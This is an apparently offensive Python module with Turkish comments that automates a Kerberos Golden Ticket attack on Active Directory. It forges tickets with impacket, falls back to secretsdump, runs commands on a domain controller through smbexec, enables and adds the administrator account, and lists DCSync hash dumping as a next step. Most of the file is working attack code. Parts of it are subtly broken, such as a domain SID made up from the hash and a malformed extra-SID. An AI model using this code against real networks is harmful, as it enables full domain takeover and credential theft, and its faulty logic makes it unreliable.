"""
Golden Ticket Automation Module
KRBTGT hash analizi yaparak Domain Admin olunmasını sağlar.
"""
import subprocess
import os
from dataclasses import dataclass
from typing import Optional, Dict, List
from cybermodules.llm_engine import analyze_with_llm


@dataclass
class GoldenTicketResult:
    success: bool
    ticket_file: Optional[str] = None
    command: Optional[str] = None
    output: Optional[str] = None
    error: Optional[str] = None


class GoldenTicketAutomation:
    """Golden Ticket forgeries and executes with Domain Controller"""
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.krb5cc_path = "/tmp/krb5cc"
    
    def is_krbtgt_hash(self, hash_str: str) -> bool:
        """
        Hash'in KRBTGT hash olup olmadığını analiz eder.
        LLM kullanarak hash tipini belirler.
        """
        krbtgt_indicators = [
            "krb5asrep", "krb5tgs", "krbtgt", "23b6d2b3c5e9f1a4d5c8",
            "aes256", "aes128", "des3", "rc4"
        ]
        
        hash_lower = hash_str.lower()
        
        # Basit keyword kontrolü
        for indicator in krbtgt_indicators:
            if indicator in hash_lower:
                return True
        
        # LLM ile analiz (varsa)
        try:
            llm_result = analyze_with_llm(
                f"Bu hash bir KRBTGT hash mi? Hash: {hash_str[:50]}... "
                "Sadece 'EVET' veya 'HAYIR' yanıt ver."
            )
            if "EVET" in llm_result.upper() or "YES" in llm_result.upper():
                return True
        except Exception:
            pass
        
        return False
    
    def forge_golden_ticket(
        self,
        hash_str: str,
        domain: str,
        target_dc: str,
        user: str = "administrator",
        sid: Optional[str] = None
    ) -> GoldenTicketResult:
        """
        Golden Ticket oluşturur.
        
        Args:
            hash_str: KRBTGT hash (NTLM veya AES)
            domain: Active Directory domain adı (örn: CORP.LOCAL)
            target_dc: Hedef Domain Controller IP/hostname
            user: Ticket içindeki kullanıcı (default: administrator)
            sid: Domain SID (biliniyorsa)
        
        Returns:
            GoldenTicketResult: Ticket oluşturma sonucu
        """
        try:
            # Hash formatını düzenle
            hash_clean = hash_str.strip()
            if ":" in hash_clean:
                # NTLM:hash formatı
                lm_hash, nt_hash = hash_clean.split(":", 1)
            else:
                # Sadece NTLM hash
                nt_hash = hash_clean
                lm_hash = "aad3b435b51404eeaad3b435b51404ee"  # Empty LM hash
            
            # SID belirtilmemişse, default SID kullan
            if not sid:
                # Get-DomainSID PowerShell komutu ile alınabilir
                sid = f"S-1-5-21-{hash_clean[:16]}..."
            
            # Ticket oluşturma komutu
            cmd = [
                "python3", "-m", "impacket.ticketer",
                "-nthash", nt_hash,
                "-domain-sid", sid,
                "-domain", domain,
                "-user", user,
                "-groups", "512",
                "-extra-sid", "S-1-5-21-" + domain.upper().replace(".", "-") + "-519",
            ]
            
            # Impacket ticketer çalıştır
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode != 0:
                # Alternatif: secretsdump tarzı kullanım
                alt_cmd = [
                    "secretsdump.py",
                    "-hashes", f"{lm_hash}:{nt_hash}",
                    f"{domain}/{user}@{target_dc}"
                ]
                
                alt_result = subprocess.run(
                    alt_cmd,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                
                if alt_result.returncode == 0:
                    return GoldenTicketResult(
                        success=True,
                        command=" ".join(alt_cmd),
                        output=alt_result.stdout[:500]
                    )
                
                return GoldenTicketResult(
                    success=False,
                    error=f"Ticket oluşturulamadı: {result.stderr}"
                )
            
            return GoldenTicketResult(
                success=True,
                command=" ".join(cmd),
                output=result.stdout[:500]
            )
            
        except subprocess.TimeoutExpired:
            return GoldenTicketResult(
                success=False,
                error="Ticket oluşturma timeout oldu"
            )
        except Exception as e:
            return GoldenTicketResult(
                success=False,
                error=str(e)
            )
    
    def execute_with_ticket(
        self,
        target: str,
        ticket_path: str = "/tmp/krbtgt.ccache",
        command: str = "whoami"
    ) -> Dict:
        """
        Golden Ticket kullanarak hedefte komut çalıştırır.
        
        Args:
            target: Hedef IP/hostname
            ticket_path: Ticket dosya yolu
            command: Çalıştırılacak komut
        
        Returns:
            Dict: Komut çıktısı
        """
        try:
            # KRB5CCNAME ortam değişkeni set et
            env = os.environ.copy()
            env["KRB5CCNAME"] = ticket_path
            
            # smbexec veya wmiexec ile komut çalıştır
            cmd = [
                "smbexec.py",
                "-k",
                "-no-pass",
                f" administrator@{target}",
                command
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
                env=env
            )
            
            return {
                "success": result.returncode == 0,
                "output": result.stdout,
                "error": result.stderr if result.returncode != 0 else None
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    def full_domain_admin_attack(
        self,
        krbtgt_hash: str,
        domain: str,
        dc_ip: str,
        domain_sid: Optional[str] = None
    ) -> Dict:
        """
        Tam Golden Ticket saldırısı gerçekleştirir.
        1. Hash analizi
        2. Golden Ticket oluşturma
        3. DC'de komut çalıştırma
        
        Args:
            krbtgt_hash: KRBTGT NTLM hash
            domain: Domain adı
            dc_ip: Domain Controller IP
            domain_sid: Domain SID (varsa)
        
        Returns:
            Dict: Saldırı sonucu
        """
        # Step 1: Hash analizi
        is_krbtgt = self.is_krbtgt_hash(krbtgt_hash)
        
        if not is_krbtgt:
            return {
                "step": "hash_analysis",
                "success": False,
                "message": "Bu hash KRBTGT hash değil gibi görünüyor",
                "recommendation": "Hashdump sonuçlarını kontrol edin, KRBTGT hesabını arayın"
            }
        
        # Step 2: Golden Ticket oluştur
        ticket_result = self.forge_golden_ticket(
            hash_str=krbtgt_hash,
            domain=domain,
            target_dc=dc_ip,
            sid=domain_sid
        )
        
        if not ticket_result.success:
            return {
                "step": "ticket_forge",
                "success": False,
                "error": ticket_result.error
            }
        
        # Step 3: DC'de komut çalıştır
        # Önce privilege debug ekle
        priv_result = self.execute_with_ticket(
            target=dc_ip,
            command="whoami && hostname"
        )
        
        # Sonra DC'yi zorla ele geçir
        admin_result = self.execute_with_ticket(
            target=dc_ip,
            command="net user administrator /active:yes && net localgroup administrators administrator /add"
        )
        
        return {
            "step": "complete",
            "success": priv_result["success"] or admin_result["success"],
            "is_krbtgt": True,
            "ticket_created": ticket_result.success,
            "initial_check": priv_result,
            "domain_admin": admin_result,
            "message": "Golden Ticket başarıyla oluşturuldu ve çalıştırıldı!",
            "next_steps": [
                "DCSync ile tüm hashleri çek: secretsdump.py",
                "BloodHound ile güvenlik haritası çıkar",
                "Golden Ticket ile tüm sistemlere erişim sağla"
            ]
        }
